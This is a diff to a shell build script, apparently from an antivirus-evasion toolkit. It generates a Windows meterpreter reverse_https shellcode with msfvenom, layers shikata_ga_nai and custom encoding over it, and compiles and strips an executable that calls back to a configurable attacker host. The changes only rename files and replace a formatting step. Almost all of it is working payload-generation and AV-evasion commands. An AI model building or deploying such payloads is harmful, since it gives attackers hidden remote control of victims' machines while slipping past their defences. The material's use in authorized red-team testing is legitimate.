@@ -21,10 +21,10 @@ LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 # additionally to the avet encoder, further encoding should be used
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc.txt
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc_c.txt
 
 # Apply AVET encoding via format.sh tool
-./tools/format.sh input/sc.txt > output/thepayload.txt
+encode_shellcode avet input/sc_c.txt output/scenc_raw.txt
 
 # set shellcode source
 set_shellcode_source dynamic_from_file
@@ -48,4 +48,4 @@ strip output/output.exe
 cleanup_techniques
 
 # Call the generated executable like:
-# output.exe thepayload.txt
+# output.exe scenc_raw.txt
